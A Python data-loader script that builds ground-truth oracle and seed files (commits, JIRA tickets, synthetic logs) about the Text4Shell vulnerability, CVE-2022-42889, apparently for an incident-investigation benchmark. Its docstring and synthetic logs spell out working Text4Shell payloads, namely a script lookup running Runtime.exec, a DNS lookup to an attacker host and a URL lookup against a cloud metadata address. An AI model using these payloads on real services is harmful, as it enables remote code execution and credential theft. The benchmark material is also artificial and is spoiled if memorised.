"""
Text4Shell Fetcher
------------------
Fetches ground-truth oracle values AND seed data for CVE-2022-42889 (Text4Shell)
from public APIs, then writes:

    data/oracles/text4shell.json          — evaluator ground truth
    data/seeds/text4shell_commits.json    — real commits from apache/commons-text
    data/seeds/text4shell_tickets.json    — real JIRA tickets from Apache JIRA
    data/seeds/text4shell_logs.json       — synthetic logs (no public log source exists)

Vulnerability:
    Apache Commons Text 1.5–1.9 — StringSubstitutor.replace() performs variable
    interpolation by default, including dangerous lookup prefixes:
        ${script:javascript:...}  →  arbitrary Java ScriptEngine execution
        ${dns:attacker.com}       →  DNS lookup (SSRF / data exfiltration)
        ${url:UTF-8:http://...}   →  URL fetching (SSRF)
    Fix: commons-text 1.10.0 disables all these lookups by default.

Sources:
    GitHub  : apache/commons-text  (commits around Oct 2022)
    JIRA    : issues.apache.org/jira  project TEXT  (TEXT-191, TEXT-192)

Usage:
    uv run python data/loaders/text4shell_fetcher.py --token ghp_...

    # Custom output:
    uv run python data/loaders/text4shell_fetcher.py --token ghp_... \\
        --oracle-out data/oracles/text4shell.json
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import sys
import time
from pathlib import Path

import httpx

GITHUB_API    = "https://api.github.com"
JIRA_API      = "https://issues.apache.org/jira/rest/api/2"
REPO          = "apache/commons-text"

# Path of the file whose history reveals the fix commit.
# StringLookupFactory.java is where dangerous lookups are disabled by default.
FIX_FILE_PATH = (
    "src/main/java/org/apache/commons/text/lookup/StringLookupFactory.java"
)

# JIRA project to search for the CVE ticket.
JIRA_PROJECT  = "TEXT"
CVE_ID        = "CVE-2022-42889"

# Java class names that appear in logs when StringSubstitutor is involved
LOGGER_CLASS_RE = re.compile(
    r"(StringSubstitutor|StringLookupFactory|ScriptStringLookup"
    r"|DnsStringLookup|UrlStringLookup|InterpolatorStringLookup)"
)

# Root-cause keywords to extract from ticket text
ROOT_CAUSE_RE = re.compile(
    r"\b(interpolat\w*|script\s+lookup|string\s*substitutor"
    r"|cve-2022-42889|ssrf|script\s*engine|scriptengine"
    r"|dns\s+lookup|url\s+lookup)\b",
    re.IGNORECASE,
)

DEFAULT_ORACLE_OUT  = Path("data/oracles/text4shell.json")
DEFAULT_COMMITS_OUT = Path("data/seeds/text4shell_commits.json")
DEFAULT_TICKETS_OUT = Path("data/seeds/text4shell_tickets.json")
DEFAULT_LOGS_OUT    = Path("data/seeds/text4shell_logs.json")

_TOKEN: str | None = None


# ── GitHub helpers ─────────────────────────────────────────────────────────────

def _gh_headers() -> dict[str, str]:
    h = {"Accept": "application/vnd.github+json"}
    if _TOKEN:
        h["Authorization"] = f"Bearer {_TOKEN}"
    return h


def _fetch_fix_commits(client: httpx.Client) -> list[dict]:
    """
    Fetch commits that touched FIX_FILE_PATH between 2022-01-01 and 2022-11-01.
    This window contains exactly the CVE fix for commons-text 1.10.0 (released 2022-10-27)
    without picking up unrelated later changes to the same file.
    """
    print(f"Fetching commit history for {FIX_FILE_PATH}...")
    page, raw = 1, []
    while True:
        resp = client.get(
            f"{GITHUB_API}/repos/{REPO}/commits",
            headers=_gh_headers(),
            params={
                "path":     FIX_FILE_PATH,
                "since":    "2022-01-01T00:00:00Z",
                "until":    "2022-11-01T00:00:00Z",
                "per_page": 50,
                "page":     page,
            },
        )
        resp.raise_for_status()
        batch = resp.json()
        if not batch:
            break
        raw.extend(batch)
        print(f"  page {page}: {len(batch)} commits touching this file")
        page += 1
        time.sleep(0.3)
    print(f"  {len(raw)} commits in window")
    return raw


def _fetch_commit_detail(client: httpx.Client, sha: str) -> dict:
    resp = client.get(
        f"{GITHUB_API}/repos/{REPO}/commits/{sha}",
        headers=_gh_headers(),
    )
    resp.raise_for_status()
    return resp.json()


def _search_commits_by_ticket(client: httpx.Client, ticket_id: str) -> list[dict]:
    """Use GitHub commit search to find commits mentioning a JIRA ticket ID."""
    headers = _gh_headers()
    headers["Accept"] = "application/vnd.github.cloak-preview+json"
    resp = client.get(
        f"{GITHUB_API}/search/commits",
        headers=headers,
        params={"q": f"repo:{REPO} {ticket_id}", "per_page": 10},
    )
    if resp.status_code not in (200,):
        return []
    return resp.json().get("items", [])


def _primary_fix_commit(commits: list[dict]) -> dict:
    """
    From the file-history candidates, prefer commits that mention CVE keywords
    or security-related terms. Fall back to the most recent commit.
    """
    priority_terms = ["cve", "security", "disable", "default", "lookup", "TEXT-220", "TEXT-225"]
    for term in priority_terms:
        for c in sorted(commits, key=lambda c: c["commit"]["author"]["date"], reverse=True):
            if term.lower() in c["commit"]["message"].lower():
                return c
    return sorted(commits, key=lambda c: c["commit"]["author"]["date"])[-1]


def _extract_logger_keywords(detail: dict) -> list[str]:
    keywords: list[str] = []
    for f in detail.get("files", []):
        stem = Path(f["filename"]).stem
        if LOGGER_CLASS_RE.match(stem):
            if stem not in keywords:
                keywords.append(stem)
        for m in LOGGER_CLASS_RE.finditer(f.get("patch", "")):
            kw = m.group(1)
            if kw not in keywords:
                keywords.append(kw)
    return keywords or ["StringSubstitutor", "StringLookupFactory"]


def _build_commit_seed(c: dict, detail: dict) -> dict:
    sha = c["sha"]
    files_changed = [f["filename"] for f in detail.get("files", [])]
    diff_parts = []
    for f in detail.get("files", []):
        patch = f.get("patch", "")
        if patch:
            diff_parts.append(f"--- {f['filename']}\n{patch[:800]}")
    return {
        "sha":           sha,
        "sha_short":     sha[:12],
        "message":       detail["commit"]["message"],
        "author":        detail["commit"]["author"]["name"],
        "date":          detail["commit"]["author"]["date"],
        "files_changed": files_changed,
        "diff":          "\n\n".join(diff_parts)[:4000],
        "url":           detail["html_url"],
    }


# ── JIRA helpers ───────────────────────────────────────────────────────────────

def _fetch_tickets_by_cve(client: httpx.Client) -> list[dict]:
    """
    Search Apache JIRA for tickets that mention the CVE ID in project TEXT.
    This avoids hardcoding ticket numbers (TEXT-191 is a different, older ticket).
    """
    jql = f'project = {JIRA_PROJECT} AND text ~ "{CVE_ID}" ORDER BY created ASC'
    print(f"  Searching JIRA: {jql}")
    resp = client.get(
        f"{JIRA_API}/search",
        params={"jql": jql, "fields": "summary,status,priority,created,description,fixVersions,comment", "maxResults": 10},
    )
    if resp.status_code != 200:
        print(f"  [WARN] JIRA search failed ({resp.status_code}) — trying known IDs")
        return _fetch_tickets_by_ids(client, ["TEXT-233", "TEXT-234"])
    issues = resp.json().get("issues", [])
    print(f"  {len(issues)} tickets found")
    return [_parse_ticket(i) for i in issues]


def _fetch_tickets_by_ids(client: httpx.Client, ids: list[str]) -> list[dict]:
    tickets = []
    for tid in ids:
        print(f"  Fetching {tid}...")
        resp = client.get(
            f"{JIRA_API}/issue/{tid}",
            params={"fields": "summary,status,priority,created,description,fixVersions,comment"},
        )
        if resp.status_code == 404:
            print(f"  {tid} not found — skipping")
            continue
        if resp.status_code == 200:
            tickets.append(_parse_ticket(resp.json()))
        time.sleep(0.3)
    return tickets


def _parse_ticket(raw: dict) -> dict:
    fields = raw["fields"]
    ticket_id = raw["key"]
    comments = [
        c["body"].strip()[:300]
        for c in fields.get("comment", {}).get("comments", [])[:5]
        if c.get("body")
    ]
    return {
        "id":           ticket_id,
        "title":        fields.get("summary", ""),
        "status":       fields.get("status", {}).get("name", ""),
        "priority":     fields.get("priority", {}).get("name", ""),
        "created":      fields.get("created", "")[:10],
        "fix_versions": [v["name"] for v in fields.get("fixVersions", [])],
        "description":  (fields.get("description") or "").strip()[:600],
        "comments":     comments,
        "url":          f"https://issues.apache.org/jira/browse/{ticket_id}",
        "labels":       ["text4shell", CVE_ID, "stringsubstitutor", "security"],
    }


def _extract_root_cause_keywords(tickets: list[dict]) -> list[str]:
    seen: set[str] = set()
    keywords: list[str] = []
    for t in tickets:
        text = t["title"] + " " + t["description"]
        for m in ROOT_CAUSE_RE.finditer(text):
            kw = re.sub(r"\s+", "_", m.group(1).lower().strip())
            if kw not in seen:
                seen.add(kw)
                keywords.append(kw)
    return keywords or ["interpolation", "script", "stringsubstitutor"]


# ── Synthetic logs ─────────────────────────────────────────────────────────────
# No public log source exists for Text4Shell (it's a library, not a standalone app).
# Logs are synthesised to faithfully represent what a Java service using
# StringSubstitutor would emit when processing a malicious payload.

_SYNTHETIC_LOGS = [
    {
        "id": "t4s-0001",
        "timestamp": "2022-10-27T08:15:03Z",
        "service": "template-svc",
        "level": "INFO",
        "trace_id": "t-t4s-0001",
        "logger": "com.company.template.NotificationTemplateRenderer",
        "message": (
            "Rendering notification template for user="
            "'${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}'"
            " template=welcome_email"
        ),
        "env": "production",
        "note": "synthetic — represents attacker-controlled display_name field passed to StringSubstitutor.replace()",
    },
    {
        "id": "t4s-0002",
        "timestamp": "2022-10-27T08:15:03Z",
        "service": "template-svc",
        "level": "WARN",
        "trace_id": "t-t4s-0001",
        "logger": "org.apache.commons.text.lookup.ScriptStringLookup",
        "message": (
            "ScriptStringLookup: executing script engine lookup. "
            "engine=javascript expression=java.lang.Runtime.getRuntime().exec(\"id\")"
        ),
        "env": "production",
        "note": "synthetic — ScriptStringLookup executes before any guard is in place",
    },
    {
        "id": "t4s-0003",
        "timestamp": "2022-10-27T08:15:04Z",
        "service": "template-svc",
        "level": "ERROR",
        "trace_id": "t-t4s-0001",
        "logger": "com.company.template.NotificationTemplateRenderer",
        "message": (
            "StringSubstitutor variable resolution triggered OS process: "
            "output='uid=1000(app) gid=1000(app)'. "
            "CVE-2022-42889: commons-text 1.9 allows script/dns/url lookups by default."
        ),
        "env": "production",
        "note": "synthetic",
    },
    {
        "id": "t4s-0004",
        "timestamp": "2022-10-27T08:16:11Z",
        "service": "template-svc",
        "level": "ERROR",
        "trace_id": "t-t4s-0002",
        "logger": "com.company.template.NotificationTemplateRenderer",
        "message": (
            "Template rendering failed — StringSubstitutor payload in user input. "
            "payload='${dns:attacker.company.com}' user_id=8812"
        ),
        "env": "production",
        "note": "synthetic — DNS-based SSRF / data exfiltration variant",
    },
    {
        "id": "t4s-0005",
        "timestamp": "2022-10-27T08:16:12Z",
        "service": "template-svc",
        "level": "ERROR",
        "trace_id": "t-t4s-0002",
        "logger": "org.apache.commons.text.lookup.DnsStringLookup",
        "message": (
            "DnsStringLookup: resolving attacker.company.com. "
            "Response=93.184.216.34. Lookup triggered by user-controlled input."
        ),
        "env": "production",
        "note": "synthetic",
    },
    {
        "id": "t4s-0006",
        "timestamp": "2022-10-27T08:17:30Z",
        "service": "template-svc",
        "level": "WARN",
        "trace_id": "t-t4s-0003",
        "logger": "com.company.security.InputSanitizer",
        "message": (
            "Suspicious StringSubstitutor variable detected in template input: "
            "${url:UTF-8:http://169.254.169.254/latest/meta-data/}. "
            "Possible SSRF via commons-text CVE-2022-42889."
        ),
        "env": "production",
        "note": "synthetic — IMDS metadata exfiltration attempt via url lookup",
    },
    {
        "id": "t4s-0007",
        "timestamp": "2022-10-27T08:18:02Z",
        "service": "template-svc",
        "level": "ERROR",
        "trace_id": "t-t4s-0004",
        "logger": "com.company.template.NotificationTemplateRenderer",
        "message": (
            "commons-text StringSubstitutor exploit attempts: 14 in last 120s. "
            "Payloads: script/dns/url lookups. All requests returning 500. "
            "commons-text version=1.9 is vulnerable. Upgrade to 1.10.0 required."
        ),
        "env": "production",
        "note": "synthetic",
    },
    {
        "id": "t4s-0008",
        "timestamp": "2022-10-27T08:19:45Z",
        "service": "template-svc",
        "level": "WARN",
        "trace_id": "t-t4s-0005",
        "logger": "com.company.template.NotificationTemplateRenderer",
        "message": (
            "Template rendering failure rate 31% over last 90s. "
            "All failures trace to StringSubstitutor.replace() on user-controlled input. "
            "Likely caused by CVE-2022-42889 exploit attempts."
        ),
        "env": "production",
        "note": "synthetic",
    },
    {
        "id": "t4s-0009",
        "timestamp": "2022-10-27T08:45:00Z",
        "service": "template-svc",
        "level": "INFO",
        "trace_id": "t-t4s-0006",
        "logger": "com.company.deploy.ReleaseManager",
        "message": (
            "Deploying commons-text 1.10.0 fix for CVE-2022-42889. "
            "Change: StringLookupFactory disables ScriptStringLookup, DnsStringLookup, "
            "UrlStringLookup by default (TEXT-191). Restarting template-svc."
        ),
        "env": "production",
        "note": "synthetic",
    },
    {
        "id": "t4s-0010",
        "timestamp": "2022-10-27T08:46:10Z",
        "service": "template-svc",
        "level": "INFO",
        "trace_id": "t-t4s-0007",
        "logger": "org.apache.commons.text.lookup.StringLookupFactory",
        "message": (
            "StringLookupFactory initialised. commons-text 1.10.0. "
            "Dangerous lookups disabled by default: SCRIPT=false DNS=false URL=false. "
            "CVE-2022-42889 mitigated."
        ),
        "env": "production",
        "note": "synthetic",
    },
    {
        "id": "t4s-0011",
        "timestamp": "2022-10-27T08:46:30Z",
        "service": "template-svc",
        "level": "INFO",
        "trace_id": "t-t4s-0008",
        "logger": "com.company.template.NotificationTemplateRenderer",
        "message": (
            "StringSubstitutor.replace() processed payload "
            "'${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}' "
            "— returned literal string, script lookup not executed. "
            "commons-text 1.10.0 active."
        ),
        "env": "production",
        "note": "synthetic — confirms fix is effective",
    },
    {
        "id": "t4s-0012",
        "timestamp": "2022-10-27T08:47:00Z",
        "service": "template-svc",
        "level": "INFO",
        "trace_id": "t-t4s-0009",
        "logger": "com.company.template.NotificationTemplateRenderer",
        "message": (
            "Template rendering fully restored. "
            "commons-text 1.10.0 deployed. "
            "CVE-2022-42889 mitigated. Failure rate 0%."
        ),
        "env": "production",
        "note": "synthetic",
    },
]


# ── Main ───────────────────────────────────────────────────────────────────────

def main() -> None:
    global _TOKEN

    parser = argparse.ArgumentParser(
        description="Fetch Text4Shell (CVE-2022-42889) oracle + seed data"
    )
    parser.add_argument("--token",       default=os.getenv("GITHUB_TOKEN"),
                        help="GitHub personal access token (or set GITHUB_TOKEN env var)")
    parser.add_argument("--oracle-out",  type=Path, default=DEFAULT_ORACLE_OUT)
    parser.add_argument("--commits-out", type=Path, default=DEFAULT_COMMITS_OUT)
    parser.add_argument("--tickets-out", type=Path, default=DEFAULT_TICKETS_OUT)
    parser.add_argument("--logs-out",    type=Path, default=DEFAULT_LOGS_OUT)
    args = parser.parse_args()

    _TOKEN = args.token
    if _TOKEN:
        print(f"GitHub token: {_TOKEN[:8]}...")
    else:
        print("[WARN] No token — rate-limited to 60 req/hr. Pass --token ghp_...")

    for p in (args.oracle_out, args.commits_out, args.tickets_out, args.logs_out):
        p.parent.mkdir(parents=True, exist_ok=True)

    with httpx.Client(timeout=30.0) as client:

        # ── 1. JIRA tickets first — gives us real ticket IDs to search commits with ──
        print("Fetching JIRA tickets...")
        tickets: list[dict] = _fetch_tickets_by_cve(client)
        if not tickets:
            print("[WARN] No JIRA tickets found for CVE. Oracle ticket_ids will be empty.")
        ticket_ids_found = [t["id"] for t in tickets]
        root_cause_keywords = _extract_root_cause_keywords(tickets)
        args.tickets_out.write_text(json.dumps(tickets, indent=2), encoding="utf-8")
        print(f"Wrote {len(tickets)} tickets -> {args.tickets_out}")

        # ── 2. Commits — search by ticket ID first, fall back to file history ───
        # Strategy A: search commits for the real ticket ID (TEXT-220, TEXT-225 etc.)
        # This finds the exact fix commit regardless of which file it changed.
        primary_candidate: dict | None = None
        for tid in ticket_ids_found:
            print(f"\nSearching commits for ticket {tid}...")
            results = _search_commits_by_ticket(client, tid)
            time.sleep(0.4)
            if results:
                # Pick the most recent result that's before the 1.10.0 release date
                eligible = [
                    r for r in results
                    if r["commit"]["author"]["date"] <= "2022-10-28T00:00:00Z"
                ]
                if eligible:
                    primary_candidate = sorted(
                        eligible, key=lambda c: c["commit"]["author"]["date"]
                    )[-1]
                    print(f"  Found fix commit via {tid}: {primary_candidate['sha'][:12]}")
                    break

        # Strategy B: file-history fallback
        try:
            file_commits = _fetch_fix_commits(client)
        except httpx.HTTPStatusError as e:
            if e.response.status_code == 403:
                print("\n[ERROR] GitHub rate limit. Pass --token ghp_...\n")
                sys.exit(1)
            raise

        # Combine: ticket-search result + file-history candidates
        all_candidates = file_commits[:]
        if primary_candidate:
            shas = {c["sha"] for c in all_candidates}
            if primary_candidate["sha"] not in shas:
                all_candidates.append(primary_candidate)

        if not all_candidates:
            print("[ERROR] No commits found.")
            sys.exit(1)

        # Pick primary: ticket-search win takes precedence, else heuristic
        primary = primary_candidate if primary_candidate else _primary_fix_commit(all_candidates)

        # Fetch diffs — ticket-search winner + up to 4 file-history commits
        to_fetch = [primary] if primary_candidate else []
        for c in sorted(file_commits, key=lambda c: c["commit"]["author"]["date"])[-4:]:
            if c["sha"] != primary["sha"]:
                to_fetch.append(c)

        print(f"\nFetching diffs for {len(to_fetch)} commits...")
        details: dict[str, dict] = {}
        commit_seeds: list[dict] = []
        for c in to_fetch:
            d = _fetch_commit_detail(client, c["sha"])
            details[c["sha"]] = d
            commit_seeds.append(_build_commit_seed(c, d))
            time.sleep(0.4)
        commit_seeds.sort(key=lambda x: x["date"])

        sha          = primary["sha"]
        primary_date = primary["commit"]["author"]["date"][:10]
        print(f"\nPrimary fix commit: {sha[:12]}  {primary_date}")
        print(f"  {primary['commit']['message'][:80]}")
        if sha in details:
            changed_files = [Path(f["filename"]).name for f in details[sha].get("files", [])]
            print(f"  files: {changed_files}")
            logger_keywords = _extract_logger_keywords(details[sha])
        else:
            logger_keywords = ["StringSubstitutor", "StringLookupFactory"]

        args.commits_out.write_text(json.dumps(commit_seeds, indent=2), encoding="utf-8")
        print(f"Wrote {len(commit_seeds)} commits -> {args.commits_out}")

        # ── 3. Synthetic logs ───────────────────────────────────────────────────
        args.logs_out.write_text(json.dumps(_SYNTHETIC_LOGS, indent=2), encoding="utf-8")
        print(f"Wrote {len(_SYNTHETIC_LOGS)} synthetic log entries -> {args.logs_out}")

        # ── 4. Oracle ───────────────────────────────────────────────────────────
        all_fix_shas = [
            {
                "sha":       c["sha"],
                "sha_short": c["sha"][:12],
                "date":      c["date"][:10],
                "message":   c["message"][:80],
            }
            for c in commit_seeds
        ]

        oracle = {
            "_comment": (
                "Auto-generated by data/loaders/text4shell_fetcher.py. "
                "Commits and tickets sourced from apache/commons-text GitHub and Apache JIRA. "
                "Logs are synthetic (no public log source exists for this CVE)."
            ),
            "incident":  "CVE-2022-42889 (Text4Shell) — StringSubstitutor RCE/SSRF via script/dns/url lookups",
            "cve":       "CVE-2022-42889",
            "primary_fix_commit": {
                "sha":         sha,
                "sha_short":   sha[:12],
                "sha_prefix_8": sha[:8],
                "date":        primary_date,
                "message":     primary["commit"]["message"][:120],
                "url":         f"https://github.com/{REPO}/commit/{sha}",
            },
            "all_fix_commits":     all_fix_shas,
            "ticket_ids":          [t["id"] for t in tickets],
            "tickets":             tickets,
            "logger_keywords":     logger_keywords,
            "root_cause_keywords": root_cause_keywords,
        }

        args.oracle_out.write_text(json.dumps(oracle, indent=2), encoding="utf-8")

    print(f"\nOracle written -> {args.oracle_out}")
    print(f"  sha_prefix_8       : {sha[:8]}")
    print(f"  ticket_ids         : {oracle['ticket_ids']}")
    print(f"  logger_keywords    : {oracle['logger_keywords']}")
    print(f"  root_cause_keywords: {oracle['root_cause_keywords']}")
    print(
        f"\nNext step: run `uv run python data/loaders/text4shell_fetcher.py --token ghp_...`"
        f"\nthen the oracle will be loaded automatically by benchmarks/scenarios.py"
    )


if __name__ == "__main__":
    main()
